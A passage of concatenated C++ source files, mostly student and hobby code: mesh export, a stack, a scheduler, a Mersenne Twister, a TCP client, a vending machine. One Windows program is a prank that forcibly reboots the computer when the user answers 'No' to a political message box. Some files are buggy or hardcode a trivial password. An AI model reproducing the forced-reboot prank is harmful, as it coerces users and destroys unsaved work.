fhe[3];\n\t\tfhe[0] = f->halfedge();\n\t\tfhe[1] = fhe[0]->he_next();\n\t\tfhe[2] = fhe[1]->he_next();\n\n\t\tint vIndex[3];\n\t\tfor (int i = 0; i < 3; i++){\n\t\t\tvIndex[i] = edgeMap[fhe[i]->edge()]->id();\n\t\t}\n\t\tdelegate.createFace(&newMesh, vIndex, vid);\n\n\t\tfor (int i = 0; i < 3; i++){\n\t\t\tvIndex[0] = vertexMap[fhe[i]->source()]->id();\n\t\t\tvIndex[1] = edgeMap[fhe[i]->edge()]->id();\n\t\t\tvIndex[2] = edgeMap[fhe[(i+2)%3]->edge()]->id();\n\t\t\tdelegate.createFace(&newMesh, vIndex, ++fid);\n\t\t}\n\t}\n\n\tnewMesh.labelBoundaryEdges(); \n\n\t// Write out the resultant obj file\n\tint vObjID = 1;\n\tstd::map<int, int> vidToObjID;\n\n\tstd::ofstream os(argv[2]);\n\n\tSolidVertexIterator iter(&newMesh);\n\n\tfor(; !iter.end(); ++iter)\n\t{\n\t\tVertex *v = *iter;\n\t\tPoint p = v->point();\n\t\tos << \"v \" << p[0] << \" \" << p[1] << \" \" << p[2] << std::endl;\n\t\tvidToObjID[v->id()] = vObjID++;\n\t}\n\tos << \"# \" << (unsigned int)newMesh.numVertices() << \" vertices\" << std::endl;\n\n\tfloat u = 0.0, v = 0.0;\n\tfor(iter.reset(); !iter.end(); ++iter)\n\t{\n\t\tVertex *vv = *iter;\n\t\tstd::string key( \"uv\" );\n\t\tstd::string s = Trait::getTraitValue (vv->string(), key );\n\t\tif( s.length() > 0 )\n\t\t{\n\t\t\tsscanf( s.c_str (), \"%f %f\", &u, &v );\n\t\t}\n\t\tos << \"vt \" << u << \" \" << v << std::endl;\n\t}\n\tos << \"# \" << (unsigned int)newMesh.numVertices() << \" texture coordinates\" << std::endl;\n\n\tSolidFaceIterator fiter(&newMesh);\n\tfor(; !fiter.end(); ++fiter)\n\t{\n\t\tFace *f = *fiter;\n\t\tFaceVertexIterator viter(f);\n\t\tos << \"f \" ;\n\t\tfor(; !viter.end(); ++viter)\n\t\t{\n\t\t\tVertex *v = *viter;\n\t\t\tos << vidToObjID[v->id()] << \"/\" << vidToObjID[v->id()] << \" \";\n\t\t}\n\t",
    "//name: Gargi\n//PRN: 23070123052\n#include <iostream>\nusing namespace std;\n\nclass Stack {\npublic:\n    int capacity;\n    int top;\n    int* arr;\n\n    // Constructor to initialize stack\nStack(int capacity) {\n        this->capacity = capacity;\narr = new int[capacity];\n        top = -1; // Stack is initially empty\n    }\n\n    // Destructor to free memory\n    ~Stack() {\ndelete[] arr; // Deallocate memory\n    }\n\n    // Push method to add element to the stack\n    void push(int element) {\n        if (top < capacity - 1) { // Check if stack is not full\n            top++;\narr[top] = element;\n        } else {\ncout<< \"Stack Overflow\" <<endl;\n        }\n    }\n\n    // Pop method to remove the top element from the stack\n    void pop() {\n        if (top >= 0) {\n            top--;\n        } else {\ncout<< \"Stack Underflow\" <<endl;\n        }\n    }\n\n    // Peek method to get the top element of the stack\n    int peek() {\n        if (top >= 0) {\n            return arr[top];\n        } else {\n            return -1; // Indicate that the stack is empty\n        }\n    }\n};\n\nint main() {\n    Stack st(5);\nst.push(23);\nst.push(24);\nst.push(25);\n\ncout<<st.peek() <<endl; // Output: 25\nst.pop();\ncout<<st.peek() <<endl; // Output: 24\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"movies\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/**\n * Archivo: mutl_Q_She.cpp\n * Autor: federico.barbetti@correounivalle.edu.co\n * Fecha creacion: 2024-10-13\n * Fecha ultima modificacion: 2024-10-16\n * Licencia: GNU-GPL\n */\n\n#include<iostream>\n#include<fstream>\n#include<vector>\n#include<algorithm>\n#include<sstream>\n#include <bits/stdc++.h>\n#include <unistd.h> // For sleep\n#include<string>\n\nusing namespace std;\n\nstd::vector <string> sheduler;               //Variable GLOBAL, es un listado de registros.\nstring* d_apuntador=&sheduler[0];       //representa la primera ubicacion en la lista de ejecucion de las tareas.\nstringstream sst;\n\n\n\n\n/**\n * @brief variable GLOBAL\n * Corresponde al archivo de texto con los datos correspodientes a las\n * tareas por ejecutarse.\n */\nstring listaDatos=\"/home/fede/p_cpp_proyects/examen_parcial_1_SO/parcial_1_SO/mlq025.txt\";\n\n//string datos_recibidos;\n\n\n/// @brief\n/**\n * objeto que representa los datos de un registro correspondientes a\n * una tarea que espera su turno en la cola de \"ready\"\n */\nstruct job_ready\n{\n    int aa_serie;                         //particularizacion del objeto.\n    string a_etiq;                        //representa la etiqueta de la tarea\n   \n    int b_burst;                          //representa el Burst time de la tarea\n    int c_arrvt;                          //representa el arrival time de la tarea\n    int d_quev;                           //representa una determinada cola de procesos de tareas\n    int e_prior;                          //representa el indice de la prioridad de ejecucion de una tarea con relacion a las demas tareas\n\n    void set_registro(int ser, string et, int bt, int at, int qv, int prio){\n        aa_serie=ser;\n        a_etiq = et;\n        b_burst = bt;\n        c_arrvt = at;\n        d_quev = qv;\n        e_prior = prio;\n    }                      \n};\n\n/**\n * @brief funcion que elimina simbolos no necesarios\n * para el proceso de los datos\n * @param input \n * @return std::vector<string> \n */\nstd::vector<string> string_To_array(std::string input)\n{\n    std::replace(input.begin(), input.end(), ';', ' ');\n\n    std::istringstream stringReader{ input };\n\n    std::vector<string> str_arreglo;\n\n    string receptor;\n\n    while (stringReader >> receptor)\n    {\n\n        str_arreglo.push_back(receptor);\n    }\n\n    return str_arreglo;\n}\n\n\n/**\n * @brief Construct a new vector<job ready>orden por prioridad object\n * ordena los elementos segun el orden de prioridad dado 5>1;\n * semantica; entre mas proximo a 5, es mas prioritaria la ejecucion de la tarea.\n */\nstd::vector<job_ready>orden_por_prioridad(vector<job_ready>cola_registros){\n\n    vector<int>datos_finales;\n\n    int ref_priority = 5;             //cota referencial que determina la prioridad\n\n    for (int i = 0; i < cola_registros.size(); i++)\n    {\n        if (     (cola_registros.at(i).e_prior -  ref_priority) >\n        (cola_registros.at(i+1).e_prior - ref_priority) )\n        {\n            cola_registros.at(i+1)=cola_registros.at(i);            //mayor hacia adelante\n        }\n        \n    }\n\n    return cola_registros;\n\n}\n\n\n/**\n * @brief funcion que lee los datos de un archivo de texto suministrado\n * y retorna un vector<string> con los datos leidos.\n * \n * @param ubicacion_de_los_datos \n */\nstd::vector<string>lectura_archivo_txt(const string ubicacion_de_los_datos)\n{\n    vector<string>bloqueDatos;\n\n    vector<char*>nuevos_Datos;\n\n\n    vector<char*>lineas_recibidas;\n\n    string receptorDatos;                   //obj que recepcionara los datos filtrados\n    \n    string esperanza=\"\";\n\n    char receptor[] =\"\";\n    \n    char select_info; \n    \n    char destino[200] =\"\";                     //auxiliar para validar renglon a leer\n    \n    char b_destino[20]=\"\";\n\n    char sx_elemento[8];                       //cadena hasta el \";\"\n\n    char osx_elemento[10];\n    \n    int zt_cuenta=0;                            //cuantnos simbolos fueron leidos la ultima vez\n    \n    std::ifstream lector(ubicacion_de_los_datos);       //obj stream que lee datos del archivo de texto\n\n\n    \n    if (lector.is_open())\n    {\n        do\n        {\n\n            //char detenedor=lector.get();\n            \n           // select_info=lector.peek();\n\n            getline(lector, receptorDatos, ';');\n\n            if (!lector.fail() )                 //aqui empieza realmente el buffer\n            {\n\n\n                // if (select_info=='#' && !receptorDatos.empty())\n                // {\n                //     select_info=lector.peek();\n                //     cout<<receptorDatos<<endl;\n                    \n                // }\n\n                cout<<receptorDatos<<endl;\n\n                bloqueDatos.push_back(receptorDatos);\n\n\n                \n\n\n                \n            }\n            else{\n                cout<<\".... latencia positiva....\"<<endl;\n            }\n\n            \n        } while (!lector.fail());\n        \n        \n    }\n    else{\n\n        cout<<\"no se pudo abrir el stream\"<<endl;\n    }\n\n    //veficaciones\n\n    for (int i = 0; i < bloqueDatos.size(); i++)\n    {\n     ",
    "// Implementa\u00e7\u00e3o baseada na descri\u00e7\u00e3o do algoritmo de https://www.sciencedirect.com/topics/computer-science/mersenne-twister.\n\n#include <iostream>\n\n#define N 624\n#define M 397\n#define UPPER_MASK 0x80000000 // w-r bits mais significativos\n#define LOWER_MASK 0x7fffffff // r bits menos significativos\nstatic unsigned long state[N]; // Vetor de estados Y\nstatic int stateIdx = N+1; // stateIdx==N+1 significa que o vetor de estados n\u00e3o foi inicializado\n\nuint32_t genrand_int32(void) {\n    static uint32_t constants[2] = {0x0, 0x9908b0df};\n    uint32_t y;\n    // Atualiza\u00e7\u00e3o do vetor de estados\n    if (stateIdx >= N) {\n        int k;\n        for (k=0; k<N-M; k++) {\n            y = (state[k]&UPPER_MASK) | (state[k+1]&LOWER_MASK);\n            state[k] = state[k+M] ^ (y>>1) ^ constants[y&0x1];\n        }\n        for (; k<N-1; k++) {\n            y = (state[k]&UPPER_MASK) | (state[k+1]&LOWER_MASK);\n            state[k] = state[k+(M-N)] ^ (y>>1) ^ constants[y&0x1];\n        }\n        y = (state[N-1]&UPPER_MASK) | (state[0]&LOWER_MASK);\n        state[N-1] = state[M-1] ^ (y>>1) ^ constants[y&0x1];\n        stateIdx = 0;\n    }\n    // Gera\u00e7\u00e3o de n\u00famero pseudoaleat\u00f3rio\n    y = state[stateIdx++];\n    // Tempering\n    y ^= (y >> 11);\n    y ^= (y << 7) & 0x9d2c5680;\n    y ^= (y << 15) & 0xefc60000;\n    y ^= (y >> 18);\n\n    return y;\n}\n\nint main() {\n    // Inicializa\u00e7\u00e3o do vetor de estados\n    for (int k = 0; k < N; k++) {\n        state[k] = k;\n    }\n\n    // Gera\u00e7\u00e3o de n\u00fameros pseudoaleat\u00f3rios\n    for (int k = 0; k < 10000; k++) {\n        printf(\"%u\\n\", genrand_int32());\n    }\n}",
    "\ufeff// Copyright (c) 2024 The nethello project authors. SPDX-License-Identifier: MIT.\n// This file is part of nethello(https://github.com/wichue/nethello).\n\n#include \"TcpClient.h\"\n\nusing namespace std;\n\nnamespace chw {\n\nTcpClient::TcpClient(const EventLoop::Ptr &poller) : Client(poller)\n{\n    _poller = poller;\n    setOnCon(nullptr);\n}\n\nTcpClient::~TcpClient() {\n    TraceL << \"~\" << TcpClient::getIdentifier();\n}\n\n/**\n * @brief \u521b\u5efatcp\u5ba2\u6237\u7aef\n * \n * @param url       [in]\u8fdc\u7aefip\n * @param port      [in]\u8fdc\u7aef\u7aef\u53e3\n * @param localport [in]\u672c\u5730\u7aef\u53e3\uff0c\u9ed8\u8ba40\u7531\u5185\u6838\u5206\u914d\n * @param localip   [in]\u672c\u5730ip\uff0c\u9ed8\u8ba4\"0.0.0.0\"(INADDR_ANY)\u662f\u7ed1\u5b9a\u6240\u6709\u672c\u5730ipv4\u5730\u5740\n * @return uint32_t \u6210\u529f\u8fd4\u56dechw::success\uff0c\u5931\u8d25\u8fd4\u56dechw::fail\n */\nuint32_t TcpClient::create_client(const string &url, uint16_t port, uint16_t localport, const std::string &localip) {\n    float timeout_sec = 5;\n    weak_ptr<TcpClient> weak_self = static_pointer_cast<TcpClient>(shared_from_this());\n    _socket = Socket::createSocket(_poller);\n\n    auto sock_ptr = _socket.get();\n    sock_ptr->setOnErr([weak_self, sock_ptr](const SockException &ex) {\n        auto strong_self = weak_self.lock();\n        if (!strong_self) {\n            return;\n        }\n        if (sock_ptr != strong_self->_socket.get()) {\n            //\u5df2\u7ecf\u91cd\u8fdesocket\uff0c\u4e0a\u6b21\u7684socket\u7684\u4e8b\u4ef6\u5ffd\u7565\u6389\n            return;\n        }\n        // strong_self->_timer.reset();\n        TraceL << strong_self->getIdentifier() << \" on err: \" << ex;\n        strong_self->onError(ex);\n    });\n\n    //TraceL << getIdentifier() << \" start connect \" << url << \":\" << port;\n    sock_ptr->connect(url, port, [weak_self](const SockException &err) {\n        auto strong_self = weak_self.lock();\n        if (strong_self) {\n            strong_self->onSockConnect(err);\n        }\n    }, timeout_sec, localip, localport);\n\n    return chw::success;\n}\n\n/**\n * @brief \u8bbe\u7f6e\u6d3e\u751f\u7c7b\u8fde\u63a5\u7ed3\u679c\u56de\u8c03\n * \n * @param oncon [in]\u8fde\u63a5\u7ed3\u679c\u56de\u8c03\n */\nvoid TcpClient::setOnCon(onConCB oncon)\n{\n    if(oncon)\n    {\n        _on_con = oncon;\n    }\n    else\n    {\n        _on_con = [](const SockException &ex){\n            if(ex)\n            {   \n                PrintE(\"tcp connect failed, please check ip and port, ex:%s.\", ex.what());\n            }\n            else\n            {   \n                PrintD(\"connect success.\");\n            }\n        };\n    }\n}\n\n/**\n * @brief \u8fde\u63a5\u7ed3\u679c\u56de\u8c03\uff0c\u6210\u529f\u5219\u8bbe\u7f6e\u63a5\u6536\u56de\u8c03\n * \n * @param ex [in]\u7ed3\u679c\n */\nvoid TcpClient::onSockConnect(const SockException &ex) {\n    // TraceL << getIdentifier() << \" connect result: \" << ex;//chw\n    if (ex) {\n        //\u8fde\u63a5\u5931\u8d25\n        // _timer.reset();\n        _on_con(ex);\n        return;\n    }\n\n    auto sock_ptr = _socket.get();\n    weak_ptr<TcpClient> weak_self = static_pointer_cast<TcpClient>(shared_from_this());\n\n    sock_ptr->setOnRead([weak_self, sock_ptr](const Buffer::Ptr &pBuf, struct sockaddr *, int) {\n        auto strong_self = weak_self.lock();\n        if (!strong_self) {\n            return;\n        }\n        if (sock_ptr != strong_self->_socket.get()) {\n            //\u5df2\u7ecf\u91cd\u8fdesocket\uff0c\u4e0a\u4f20socket\u7684\u4e8b\u4ef6\u5ffd\u7565\u6389\n            return;\n        }\n        try {\n            strong_self->onRecv(pBuf);\n        } catch (std::exception &ex) {\n            strong_self->shutdown(SockException(Err_other, ex.what()));\n        }\n    });\n\n    _on_con(ex);\n}\n\n} //namespace chw\n",
    "#include \"gtele.h\"\n#include <cmath>\n\nCRandom gtele::ran;  //random number generator\n\ngtele::gtele( double x0, double y0, double Dactive0, double Dphysical0)\n{\n  xCenter = x0;\n  yCenter = y0;\n  Dactive = Dactive0;\n  Dphysical = Dphysical0;\n\n}\n\n//************************************************\nint gtele::hit(double x, double y)\n{\n  int ihit =0;\n  if (fabs(x - xCenter) > Dactive/2.) return ihit;\n  if (fabs(y - yCenter) > Dactive/2.) return ihit;\n\n  ihit = 1;\n\n  ix = (int)((x - xCenter + Dactive/2.)/Dactive*32.);\n  iy = (int)((y - yCenter + Dactive/2.)/Dactive*32.);\n\n\n  if (ix < 16)\n    {\n      if (iy < 16) nCsI = 0;\n      else nCsI = 1;\n    }\n  else \n    {\n      if (iy < 16) nCsI = 2;\n      else nCsI = 3;\n    }\n\n\n\n  xRecon = ((double)ix+ran.Rndm())/32.*Dactive - Dactive/2. + xCenter;\n  yRecon = ((double)iy+ran.Rndm())/32.*Dactive - Dactive/2. + yCenter;\n\n  \n\n  return ihit;\n \n}\n//************************************************\nbool gtele::hitAbsorber(double x, double y)\n{\n\n  if (fabs(x - xCenter) > Dphysical/2.) return false;\n  if (fabs(y - yCenter) > Dphysical/2.) return false;\n\n  return true;\n \n}\n",
    "////////////////////////////////\r\n// sfTheoraTest 1.0.3         //\r\n// Copyright \u00a9 Kerli Low 2011 //\r\n////////////////////////////////\r\n\r\n//////////////////////////////////////////////////////////////////////////////\r\n// License:                                                                 //\r\n// sfTheoraTest                                                             //\r\n// Copyright (c) 2012 Kerli Low                                             //\r\n// kerlilow@gmail.com                                                       //\r\n//                                                                          //\r\n// This software is provided 'as-is', without any express or implied        //\r\n// warranty. In no event will the authors be held liable for any damages    //\r\n// arising from the use of this software.                                   //\r\n//                                                                          //\r\n// Permission is granted to anyone to use this software for any purpose,    //\r\n// including commercial applications, and to alter it and redistribute it   //\r\n// freely, subject to the following restrictions:                           //\r\n//                                                                          //\r\n//    1. The origin of this software must not be misrepresented; you must   //\r\n//    not claim that you wrote the original software. If you use this       //\r\n//    software in a product, an acknowledgment in the product documentation //\r\n//    would be appreciated but is not required.                             //\r\n//                                                                          //\r\n//    2. Altered source versions must be plainly marked as such, and must   //\r\n//    not be misrepresented as being the original software.                 //\r\n//                                                                          //\r\n//    3. This notice may not be removed or altered from any source          //\r\n//    distribution.                                                         //\r\n//////////////////////////////////////////////////////////////////////////////\r\n\r\n#include <iostream>\r\n#include <SFML/Graphics.hpp>\r\n\r\n#include \"sfTheora.h\"\r\n\r\n\r\n\r\nint main()\r\n{\r\n  sf::RenderWindow sfApp(sf::VideoMode(800, 600, 32), \"SFML Window\");\r\n\r\n  sf::Clock clock;\r\n\r\n  sfApp.setFramerateLimit(60);\r\n\r\n  sftheora::Video testVid(\"bunny.ogg\");\r\n  if (testVid.hasError()) {\r\n    std::cout<<testVid.getError()<<\"\\n\";\r\n    return 1;\r\n  }\r\n\r\n  while (sfApp.isOpen()) {\r\n    sf::Event sfEvent;\r\n    while (sfApp.pollEvent(sfEvent)) {\r\n      if (sfEvent.type == sf::Event::Closed)\r\n        sfApp.close();\r\n\r\n      if ((sfEvent.type == sf::Event::KeyPressed)) {\r\n        switch (sfEvent.key.code) {\r\n\t\t      case sf::Keyboard::Escape:\r\n            {\r\n              sfApp.close();\r\n              break;\r\n            }\r\n\r\n          case sf::Keyboard::F12:\r\n            {\r\n              sf::Image screen = sfApp.capture();\r\n              screen.saveToFile(\"screenshot.png\");\r\n\r\n              break;\r\n            }\r\n\r\n          case sf::Keyboard::Space:\r\n            {\r\n              testVid.togglePause();\r\n              break;\r\n            }\r\n\r\n          case sf::Keyboard::Left:\r\n            {\r\n              float time = testVid.getTime().asSeconds();\r\n              testVid.seek(sf::seconds(time - 4.0f));\r\n              break;\r\n            }\r\n\r\n          case sf::Keyboard::Right:\r\n            {\r\n              float time = testVid.getTime().asSeconds();\r\n              testVid.seek(sf::seconds(time + 4.0f));\r\n              break;\r\n            }\r\n        }\r\n      }\r\n    }\r\n\r\n    testVid.update(clock.restart());\r\n\r\n    sfApp.clear();\r\n\r\n    sfApp.draw(testVid);\r\n\r\n    sfApp.display();\r\n  }\r\n\r\n  return EXIT_SUCCESS;\r\n}\r\n",
    "#include <iostream>\n#define NOMINMAX\n#define WINDOWS32LEANANDMEAN\n#include <windows.h>\n\nvoid shutdown() {\n    HANDLE hToken;\n    TOKEN_PRIVILEGES tkp;\n\n    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {\n        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);\n\n        tkp.PrivilegeCount = 1;\n        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);\n\n        if (GetLastError() != ERROR_SUCCESS) {\n            std::cerr << \"Failed to adjust token privileges\" << std::endl;\n            CloseHandle(hToken);\n            return;\n        }\n    }\n    else {\n        std::cerr << \"Failed to open process token\" << std::endl;\n        return;\n    }\n\n    UINT flags = EWX_REBOOT | EWX_FORCE;\n\n    if (!ExitWindowsEx(flags, SHTDN_REASON_MAJOR_OTHER)) {\n        std::cerr << \"Failed to shutdown the system.\" << std::endl;\n    }\n    else {\n        std::cout << \"Shutdown initiated.\" << std::endl;\n    }\n\n    CloseHandle(hToken);\n}\n\nstatic void message() {\n    int boxno;\n    int boxyes;\n    int boxone = MessageBox(0, L\"Do you support palestine\", L\"IMPORTANT\", MB_YESNO | MB_ICONQUESTION);\n    if(boxone == IDNO) {\n\n        shutdown();\n\n        /*boxno = MessageBox(0, L\"FUCK YOU >:(\", L\"IMPORTANT\", MB_RETRYCANCEL | MB_ICONERROR);\n        boxone = MessageBox(0, L\"Do you support palestine\", L\"IMPORTANT\", MB_YESNO | MB_ICONQUESTION);*/\n\n    }\n    else {\n\n        boxyes = MessageBox(0, L\" I LOVE YOU <3\", L\"IMPORTANT\", MB_OK | MB_ICONINFORMATION);\n    }\n}\nint WinMain(\nHINSTANCE hInstance,\nHINSTANCE hPrevInstance,\nLPSTR lpCmdLine,\nint nShowCmd\n)\n{\n\n    message();\n\n\n\n\n    //std::cout << \"Hello World!\\n\";\n    std::cin.get();\n    return 0;\n}\n\n",
    "/* Get Max Charge\n\n\n\nA team of engineers at Amazon, using advanced simulation tools, are analyzing a series of interconnected systems, where each system has a charge value represented by charge[i] (which can be positive, negative, or zero).\n\nThe engineers have a specialized tool that allows them to perform the following operation: Select a system and remove it, causing the neighboring systems to automatically merge and combine their charge values. If the removed system has neighboring systems with charges x and y directly to its left and right, they will combine to form a new system with charge x + y. No combination will take place if the system is the leftmost or rightmost in the array.\n\nSince this process is computationally expensive, the engineers will simulate the operation using Amazon's advanced tools.\n\nFor example, if the system charges are [-3, 1, 4, -1, 5, -9], using the tool on the 4th system (index 3) will result in the new sequence [-3, 1, 9, -9], as the charges from the 3rd and 5th systems also combine to 4 + 5 = 9. If they then use the tool on the 1st system in this new sequence, it will become [1, 9, -9].\n\nFunction Description\n\nComplete the function getMaxCharge in the editor below. The function must return the maximum charge that can be obtained.\n\ngetMaxCharge has the following parameter:\n\nList charge: a list of integers representing the charge values\nReturns\n\nlong integer: the maximum charge that can be obtained\n\n*/\n\n\n#include <iostream>\n#include <string>\n#include <unordered_map>\n#include <iomanip>\n#include <sstream>\n#include <bits/stdc++.h>\n\nusing namespace std;\nlong long getMaxCharge(std::vector<int>& charge) {\n        int n = charge.size();\n        std::vector<long long> dp(n);\n        \n        // Base cases\n        dp[0] = charge[0];\n        if (n > 1) dp[1] = std::max((long long)charge[1], (long long)charge[0] + charge[1]);\n        \n        // Fill dp table\n        for (int i = 2; i < n; i++) {\n            dp[i] = std::max({(long long)charge[i], \n                              dp[i-1], \n                              dp[i-2] + charge[i], \n                              (i > 2 ? dp[i-3] + charge[i-1] + charge[i] : 0LL)});\n        }\n        \n        // Return maximum charge\n        return *std::max_element(dp.begin(), dp.end());\n    }\n\nlong long getMaxCharge2(std::vector<int>& charge) {\n        int n = charge.size();\n        if (n == 0) return 0;\n        if (n == 1) return charge[0];\n        \n        std::vector<long long> dp(n);\n        \n        // Initialize dp array\n        for (int i = 0; i < n; i++) {\n            dp[i] = charge[i];\n        }\n        \n        for (int len = n; len > 1; len--) {\n            std::vector<long long> new_dp(len - 1);\n            for (int i = 0; i < len - 1; i++) {\n                new_dp[i] = std::max(dp[i], dp[i+1]);\n            }\n            dp = new_dp;\n        }\n        \n        return dp[0];\n    }  \n\n\n    long long getMaxCharge3(std::vector<int>& charge) {\n        int n = charge.size();\n        if (n <= 2) return *std::max_element(charge.begin(), charge.end());\n\n        std::vector<long long> values(charge.begin(), charge.end());\n        std::set<std::pair<long long, int>> indexedValues;\n        \n        for (int i = 0; i < n; ++i) {\n            indexedValues.insert({values[i], i});\n        }\n\n        std::vector<bool> removed(n, false);\n        int remainingCount = n;\n\n        while (remainingCount > 1) {\n            auto [minValue, minIndex] = *indexedValues.begin();\n            indexedValues.erase(indexedValues.begin());\n            removed[minIndex] = true;\n            remainingCount--;\n\n            int left = minIndex - 1;\n            while (left >= 0 && removed[left]) left--;\n            \n            int right = minIndex + 1;\n            while (right < n && removed[right]) right++;\n\n            if (left >= 0 && right < n) {\n                long long sum = values[left] + values[right];\n                indexedValues.erase({values[left], left});\n                indexedValues.erase({values[right], right});\n                indexedValues.insert({sum, left});\n                values[left] = sum;\n                removed[right] = true;\n                remainingCount--;\n            }\n        }\n\n        return *std::max_element(values.begin(), values.end());\n    }\n\nint main() {\n    vector<int> test = {-2, 4, 3, -2, 1};\n    vector<int> test1 = {-2, 4, 9, 1, -1};\n    vector<int> test2 = {-1, 3, 2};\n\n    cout << \"res = \" << getMaxCharge3(test)<<endl;\n    cout << \"res1 = \" << getMaxCharge3(test1)<<endl;\n    cout << \"res2 = \" << getMaxCharge3(test2)<<endl;\n    \n    return 0;\n}\n",
    "//CAMILA ALVES FRAZ\u00c3O \n//RA: 2840482121008\n//GABRIEL LIMA DE ALMEIDA SILVA \n//RA:2840482121007 \n//A SENHA DO MODO ADM ---> 5 (IMPORTANTE!!!)\n\n\n#include <iostream>\nusing namespace std;\n\nint code,Prod_Quant[8] = {5,5,5,5,5,5,5,5},mode;\n\n  float Prod_Price[8] = {5.8, 5, 3.5, 8.1, 3, 7.5, 2.5, 4}, senha,lucro_atual = 0, lucro_futuro = 0;\n\n  string Ident_Prod[8] = {\"Doritos 84g R$ 5,80 <Codigo 0>\",\"Ruffles 76g R$ 5,00 <Codigo 1>\",\"eQlibri panetini 40g R$ 3,50 <Codigo 2>\",\"TAKITOS tortilla 300g R$ 8,10 <Codigo 3>\",\"KitKat 41,5g R$ 3,00 <Codigo 4>\",\"Bombom FERRERO ROCHER 37,5g R$ 7,50 <Codigo 5>\",\"\u00c1gua Cristal 1,5 litro R$ 2,50 <Codigo 6>\",\"Coca Cola 350 ml R$ 4,00 <Codigo 7>\"};\n\n  char count,reinicia = 'S';\n\nvoid compra_prod(){\n\n  float dindin,troco;\n  // Sele\u00e7\u00e3o do produto (Modo Usu\u00e1rio)\n\n          cout << endl;\n          cout << \"Selecione um produto digitando o codigo: \" << endl;\n          cin >> code;\n          if (Prod_Quant[code]>0){\n            // Mostrar na tela o produto escolhido e requisitando o dinheiro\n\n            cout << \"Voce selecionou \" << Ident_Prod[code] << endl << \" Insira o dinheiro\" << endl;\n            cin >> dindin;\n\n            // Pagamento do produto\n\n            while (dindin < Prod_Price[code]){\n\n              cout << \"Dinheiro insuficiente, insira valor correspondente ou maior que o do produto\" << endl;\n              cin >> dindin;\n\n            }\n\n            cout << \"Voce inseriu R$\" << dindin << endl;\n\n            Prod_Quant[code]--; \n\n            cout << \" O preco deste produto eh: R$ \"<< Prod_Price[code] << endl;\n\n            troco = dindin - Prod_Price[code];\n            lucro_atual += Prod_Price[code];\n\n            if (troco >= 0){\n\n              cout << \" O valor do seu troco eh: R$ \" << troco << endl;\n\n          }\n        }\n        else{\n          cout << \"produto indisponivel\" << endl;\n        } \n}\n\nvoid repor_prod(){\n  char dev = 'S';\n  int quant;\n\n      // Reposi\u00e7\u00e3o dos produtos    \n\n      while(dev == 'S' || dev == 's'){\n\n        cout << \"Indique o codigo do produto que deseja repor\" << endl;\n        cin >> code;\n\n        cout << \"Digite a quantidade de unidades para adicionar\" << endl;\n        cin >> quant;\n\n        Prod_Quant[code] += quant;\n\n        cout << \"O produto de <Codigo \" << code << \"> possui atualmente \" << Prod_Quant[code] << \" unidades\" << endl;;\n\n        cout << \"Se deseja adicionar mais unidades a outros produtos tecle (S)im ou (N)ao\" << endl;\n        cin >> dev;\n\n      }\n}\n\nvoid lucro_at_ft(){\n  cout <<\" O lucro atual e de R$ \"<< lucro_atual;\n\n  for(int k = 0; k < 8; k++){\n\n    lucro_futuro += Prod_Price[k] * Prod_Quant[k]; \n\n  }\n  cout << \"O lucro futuro e de R$ \" << lucro_futuro << endl;\n}\n\nint main(){\n\n\n  // Escolha do modo Usu\u00e1rio ou Administrador\n  while(reinicia == 'S' || reinicia == 's'){\n\n    cout << \" Digite um modo < 1 para Cliente > < 2 para Administrador >\" << endl;\n    cin >> mode; \n\n    if(mode==1){\n\n      cout << \"Deseja adquirir um produto desta maravilhosa maquina?\" << endl;\n      cout << \"(S)im ou (N)ao\" << endl;\n      cin >> count;\n\n      while (count == 'S'|| count == 's'){\n\n        for(int i=0;i < 8; i++){\n          cout << \"- \" << Ident_Prod[i] << endl;\n          cout << endl;\n        }\n\n          compra_prod();\n\n          cout << \"Deseja comprar outro produto (S)im ou (N)ao?\" << endl;\n          cin >> count;\n\n        }\n      }\n\n    // Login do Modo Administrador\n\n    else if (mode == 2){\n\n      int resp;\n\n      count = 'S';\n\n      while(count == 'S'|| count == 's'){\n        cout << \"Digite a senha para entrar no modo ADM\" << endl;\n        cin >> senha;\n        cout << endl;\n\n        // Listagem da quantidade de produtos restantes na maquina \n        string Ident_ProdRestante[8] = {\"-Doritos 84g <Codigo 0>\",\"-Ruffles 76g <Codigo 1>\",\"-eQlibri panetini 40g <Codigo 2>\",\"-TAKITOS tortilla 300g <Codigo 3>\",\"-KitKat 41,5g <Codigo 4>\",\"-Bombom FERRERO ROCHER 37,5g <Codigo 5>\",\"-\u00c1gua Cristal 1,5 litro <Codigo 6>\",\"-Coca Cola 350 ml <Codigo 7>\"};\n\n        if(senha == 5){\n          cout << \"Seja bem vindo ADM! Essa \u00e9 a quantidade de produtos em sua maquina:\" << endl << endl;\n\n          for (int j = 0; j < 8; j++){\n\n            cout << Ident_ProdRestante[j] << \" possui \" <<  Prod_Quant[j] << \" unidades restantes \" << endl;\n            cout << endl;\n          }\n\n          cout << \"Para repor produtos tecle 1, para calcular lucro atual e 